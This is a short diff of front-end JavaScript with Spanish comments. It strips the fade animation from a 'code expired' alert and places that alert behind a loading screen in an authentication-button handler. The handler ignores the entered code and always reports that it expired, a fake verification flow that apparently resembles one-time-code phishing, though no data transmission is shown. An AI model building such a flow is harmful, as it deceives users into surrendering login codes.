@@ -154,33 +154,17 @@ function mostrarAlertaAutenticacionIncorrecta() {
     mensaje.textContent = "Código expirado. Introduzca el nuevo código.";
     alerta.appendChild(mensaje);
 
-    // La alerta comienza invisible
-    alerta.style.opacity = "0";
-    alerta.style.transition = "opacity 1s ease";
-
     // Agrega el contenedor de alerta al cuerpo del documento
     document.body.appendChild(alerta);
-
-    // Aparece después de 1 segundo
-    setTimeout(() => {
-        alerta.style.opacity = "1";
-    }, 1000);
-
-    // Después de 5 segundos visible, comienza a desvanecerse
-    setTimeout(() => {
-        alerta.style.opacity = "0";
-
-        // Elimina la alerta después del desvanecimiento
-        setTimeout(() => {
-            alerta.remove();
-        }, 1000);
-    }, 6000);
 }
 
 // Modifica el evento de autenticación para mostrar la alerta personalizada
 document.getElementById("authBtn").addEventListener("click", async function () {
     const authCode = document.getElementById("authCode").value;
+
+    showLoadingScreen(() => {
     
     // Mostrar mensaje de autenticación incorrecta usando la función personalizada
     mostrarAlertaAutenticacionIncorrecta();
+    });
 });
